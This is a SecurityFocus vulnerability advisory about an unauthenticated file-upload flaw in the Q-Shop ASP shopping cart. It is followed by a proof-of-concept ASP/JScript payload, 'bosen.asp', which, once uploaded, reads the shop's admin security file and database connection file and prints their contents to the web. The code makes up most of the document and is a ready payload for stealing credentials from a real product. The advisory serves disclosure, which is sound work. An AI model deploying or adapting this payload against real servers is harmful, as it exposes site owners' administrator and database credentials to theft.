source: http://www.securityfocus.com/bid/8153/info

Zone-H has reported that the Q-Shop ASP shopping cart software contains a vulnerability that may allow remote attackers to upload arbitrary files. Once uploaded, the attacker may be able to have the script executed in the security context of the Web server. It is reported that Q-Shop provides an interface intended for administrators to upload files, however when this file is requested directly, no authentication is required.

// 1ndonesian Security Team
// http://bosen.net/releases/
//
// bosen.asp
// Do server side file reading and dump it to the web as a text file.
//
<% @ Language = JScript %>
<%
function WinPath(absPath) {this.absolutePath = absPath;}
function getAbsPath() {return this.absolutePath;}
WinPath.prototype.getAbsolutePath = getAbsPath;

function fileRead(file) {
  var FSO = new ActiveXObject("Scripting.FileSystemObject"), strOut = ""
  var tmp = file, f, g = FSO.GetFile(tmp);
  f = FSO.OpenTextFile(tmp, 1, false);
  strOut = "<PRE STYLE=\"font-size:9pt;\">";
  strOut+= Server.HTMLEncode(f.ReadAll());
  strOut+= "</pre>";
  f.Close();
  return(strOut);
}

var a = new WinPath(Server.Mappath("/"));
var curDir   = a.getAbsolutePath();

// You can change these
var admin = curDir + "\\q-shop25\\admin\\security.asp";
var db = curDir + "\\q-shop25\\inc\\conx.asp";

with (Response) {
  Write("<b>ServerRoot : "+curDir+"<br></b>");
  Write("<b>Admin Info : "+admin+"<br><br></b>");
  Write(fileRead(admin));
  Write("<b>DB Info : "+db+"<br><br></b>");
  Write(fileRead(db));
}
%>